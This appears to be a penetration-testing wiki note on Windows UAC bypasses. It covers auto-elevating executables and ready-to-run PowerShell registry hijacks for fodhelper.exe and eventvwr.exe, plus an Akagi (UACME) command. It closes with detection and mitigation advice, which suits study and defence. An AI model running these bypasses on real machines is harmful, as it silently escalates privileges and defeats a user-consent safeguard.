---
tags:
  - "#type/technique"
  - "#stage/privilege-escalation"
  - "#tactic/TA0004"
  - "#os/windows"
  - "#topic/uac"
aliases:
  - UAC Bypass
  - User Account Control Bypass
---
## Technique
___
User Account Control (UAC) Bypasses are methods to elevate privileges on a Windows system without triggering the UAC prompt that normally requires user consent. When successful, these techniques allow an attacker to elevate from a medium integrity process to a high integrity (administrative) process without user interaction.

UAC is a Windows security feature that helps prevent unauthorized changes to the operating system. Even when logged in as an administrator, processes run at medium integrity by default, and administrative actions require explicit approval via the UAC prompt. Bypassing this mechanism allows attackers to perform privileged operations silently.

## Prerequisites
___

**Access Level:** The user must be a member of the local Administrators group. UAC bypasses do not work for standard users.

**System State:** Effectiveness depends on the target's Windows version, patch level, and UAC settings (most bypasses work only on default settings or lower).

**UAC Settings:** Most bypasses are effective against the default UAC setting ("Notify me only when apps try to make changes to my computer"). Fewer bypasses work against the highest setting ("Always notify").

## Considerations
___

**Impact**

Successfully bypassing UAC allows an attacker to execute commands with elevated privileges without user interaction, potentially leading to further system compromise.

**OPSEC**

- UAC bypass attempts may be logged in Windows Event Logs.
- Some bypass techniques may create temporary files or registry entries that could be detected.
- Modern Windows systems have patched many known UAC bypass techniques.

## Execution
___

### Auto-Elevating Processes

Many UAC bypasses exploit Windows executables that have the "auto-elevate" property. When these executables are launched, Windows allows them to elevate to high integrity without a UAC prompt.

Examples include:
- **fodhelper.exe**: Settings application that auto-elevates
- **eventvwr.exe**: Event Viewer utility
- **sdclt.exe**: Backup and Restore utility
- **computerdefaults.exe**: Default Programs utility
- **slui.exe**: Windows Activation interface

### Registry Key Manipulation

Most auto-elevation bypasses follow this pattern:
1. Modify registry keys that control where the auto-elevating process looks for DLLs or executables
2. Place a malicious payload in that location
3. Launch the auto-elevating process, which executes the payload with high integrity

### Fodhelper UAC Bypass Example

Fodhelper.exe is an auto-elevating executable introduced in Windows 10 that can be abused:

```powershell
# Create registry keys to hijack fodhelper.exe execution
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd.exe /c start powershell.exe" -Force

# Execute fodhelper.exe to trigger the bypass
Start-Process "C:\Windows\System32\fodhelper.exe"
```

### Event Viewer UAC Bypass (Works on Windows 7, 8, 8.1)

```powershell
# Create required registry modifications
New-Item -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Name "(default)" -Value "cmd.exe /c start powershell.exe" -Force

# Launch Event Viewer to trigger the bypass
Start-Process "C:\Windows\System32\eventvwr.exe"
```

### Using UACME Project

The [UACME](https://github.com/hfiref0x/UACME) project catalogs and implements numerous UAC bypass techniques:

```cmd
# Example using Akagi (UACME) with method #33
Akagi.exe 33 "c:\windows\system32\cmd.exe"
```

### Detection & Mitigation

#### Detection

- Monitor for creation of suspicious registry keys under HKCU that mirror system paths
- Watch for process creation events where a medium integrity process spawns a high integrity child without a UAC prompt
- Look for modifications to environment variables just before launching system executables
- Monitor for unusual parent-child process relationships involving auto-elevating executables
- Look for unexpected DLL loading or COM object instantiation

#### Mitigation

- Configure UAC to the highest setting ("Always notify me")
- Keep systems updated with the latest security patches
- Use application control solutions to restrict execution of known bypass tools
- Implement the principle of least privilege for user accounts
- Consider using the Protected Administrator account mode
- Deploy Microsoft's Attack Surface Reduction rules to block suspicious behaviors
- For high-security environments, disable local administrator accounts entirely and use a tiered administration model
